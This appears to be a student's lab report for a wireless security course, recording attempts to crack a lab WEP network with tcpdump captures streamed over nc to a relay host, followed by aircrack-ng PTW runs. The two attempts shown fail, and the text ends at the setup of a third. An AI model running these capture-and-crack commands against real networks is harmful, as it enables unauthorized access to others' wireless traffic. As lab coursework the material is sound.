# Question 1: Cracking WEP

## a)

* Installing on nodes: `opkg install aircrack-ng`

## b)

* `iw wlan0 scan` output:

```
	BSS 00:1b:b1:01:dc:b2(on wlan0)
		TSF: 375550100327 usec (4d, 08:19:10)
		freq: 2462
		beacon interval: 100 TUs
		capability: ESS (0x0431)
		signal: -73.00 dBm
		last seen: 200 ms ago
		Information elements from Probe Response frame:
		SSID: WirelessLab_WEP_Crack_Me
	BSS 00:1b:b1:02:01:4e(on wlan0)
		TSF: 137333337598 usec (1d, 14:08:53)
		freq: 2412
		beacon interval: 100 TUs
		capability: ESS (0x0431)
		signal: -41.00 dBm
		last seen: 4190 ms ago
		Information elements from Probe Response frame:
		SSID: WirelessLab_WPA_Crack_Me
```

##### Start nc on steppingStone, with starting time (epoch) in filename:

```
nc -l -p 8080 > "tcpdump_run01-$(date +%s).cap"
```

### PTW attack with `tcpudmp` on node6:

#### First try:

###### Capture packets:

We used tcpdump, because `airodump-ng` makes the files locally and we couldnt find a way to forward them to stepping stone, which was needed because of lack of space on nodes.

```
tcpdump -i wlan1 -G 10800 -W 1 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-G 10800` : Capture for 10800s (3 hours)
* `-W 1` : Write only one file (stop after we hit the -G limit
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP

##### Results:

* `capinfos -A tcpdump_run01-1483830885-filtered.cap` :

```
File name:           tcpdump_run01-1483830885-filtered.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 plus radiotap radio header
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   2896 k
File size:           3373 MB
Data size:           3327 MB
Capture duration:    7875.773085 seconds
First packet time:   2017-01-08 00:14:47.512964
Last packet time:    2017-01-08 02:26:03.286049
Data byte rate:      422 kBps
Data bit rate:       3379 kbps
Average packet size: 1148,64 bytes
Average packet rate: 367 packets/s
SHA1:                e264de9430e678647886d41789b25acb47874038
RIPEMD160:           b9156d622cc7a4bf4e913924df0bd45f36ab8c70
MD5:                 31a428278626e3c398afb431b4333d7c
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Name = UNKNOWN
                     Description = NONE
                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
                     Speed = 0
                     Capture length = 65535
                     FCS length = -1
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Filter string = NONE
                     Operating system = UNKNOWN
                     Comment = NONE
                     BPF filter length = 0
                     Number of stat entries = 0
                     Number of packets = 2896715

```

* `aircrack-ng -z tcpdump_run01-1483830885-filtered.cap` :

```
Opening tcpdump_run01-1483830885-filtered.cap
Read 2896715 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (1926031 IVs)

Choosing first network as target.

Opening tcpdump_run01-1483830885-filtered.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 1926031 ivs.

			Aircrack-ng 1.2 beta3


		[00:00:12] Tested 157873 keys (got 1926031 IVs)

   KB    depth   byte(vote)
    0  131/133   C1(1923328) 04(1922816) 0F(1922560) 8D(1922560) 2F(1922304) 5B(1922304) 7A(1922304) C5(1922304) FB(1922304) B1(1921792) 
    1   84/  1   D2(1935104) 95(1934848) 38(1934592) 4D(1934336) 5E(1934336) D9(1934336) 68(1934080) 04(1933824) F0(1933824) 7D(1933312) 
    2    2/ 13   3F(1984000) 2A(1983232) 4C(1968128) BC(1966848) 5D(1965056) 88(1961984) CE(1960704) 25(1958400) 9F(1958400) EA(1957888) 
    3  255/  3   DD(1868800) 46(1979136) D7(1975040) 45(1974272) 11(1973760) F4(1972992) D5(1970944) 07(1969920) 3E(1967616) AB(1965056) 
    4    0/  4   83(2614272) 0B(1974528) 1A(1973760) C5(1973504) 29(1969152) 5B(1967872) A1(1967360) A7(1967104) 84(1966080) 28(1963520) 

Failed. Next try with 1930000 IVs.
```

#### Second try:

###### Capture packets:

```
tcpdump -i wlan1 -c 300000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-c 300000` : stop after 300.000 captured packets
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP

##### Results:

* `capinfos -A tcpdump_run02-1483874801.cap` :

```
File name:           tcpdump_run02-1483874801.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 plus radiotap radio header
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   300 k
File size:           350 MB
Data size:           345 MB
Capture duration:    794.134094 seconds
First packet time:   2017-01-08 12:26:42.462937
Last packet time:    2017-01-08 12:39:56.597031
Data byte rate:      434 kBps
Data bit rate:       3478 kbps
Average packet size: 1151,12 bytes
Average packet rate: 377 packets/s
SHA1:                e56ddd53b97500407114efcafa74eace4ea09003
RIPEMD160:           070327dc5ebc1c78b7766c2c60f6727484899a6c
MD5:                 1ab1d14d9d735d7a90a3054d1b0274d6
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Name = UNKNOWN
                     Description = NONE
                     Encapsulation = IEEE 802.11 plus radiotap radio header (23/127 - ieee-802-11-radiotap)
                     Speed = 0
                     Capture length = 65535
                     FCS length = -1
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Filter string = NONE
                     Operating system = UNKNOWN
                     Comment = NONE
                     BPF filter length = 0
                     Number of stat entries = 0
                     Number of packets = 300000

```

* `aircrack-ng -z tcpdump_run02-1483874801.cap` :

```
Opening tcpdump_run02-1483874801.cap
Read 300000 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1B:B1:01:DC:B2  WirelessLab_WEP_Crack_Me  WEP (197335 IVs)

Choosing first network as target.

Opening tcpdump_run02-1483874801.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 197335 ivs.


			Aircrack-ng 1.2 beta3


		[00:00:02] Tested 161377 keys (got 197335 IVs)

   KB    depth   byte(vote)
    0   67/ 70   FE(200960) 5D(200704) 81(200704) FB(200704) 42(200448) 7A(200448) 87(200448) E6(200448) EB(200448) 29(200192) 
    1   35/  1   89(205568) 50(205312) E4(205312) 80(205056) CA(205056) 23(204800) 56(204800) 2B(204544) F9(204544) B5(204288) 
    2   12/ 48   A2(209664) 34(209152) 72(209152) 17(208640) 9A(208640) 5B(208384) D8(208384) 4B(208128) 93(208128) 36(207872) 
    3  255/  3   A9(178176) 99(211712) 5A(210688) 14(210432) 33(210432) D3(209664) 05(209408) B6(209408) CE(209152) 3F(208896) 
    4    0/  2   83(269824) 7F(216064) 74(213248) B6(212736) F7(212480) E7(211456) 63(210688) 39(210432) EC(210432) 28(210176) 

Failed. Next try with 200000 IVs.

```

#### Third try:

###### Capture packets:

```
tcpdump -i wlan1 -c 3000000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
```

Options:

* `-i wlan1` : Capture on interface wlan1
* `-c 3000000` : stop after 3.000.000 captured packets
* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
* `-s 65535` : capture whole packets
* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP



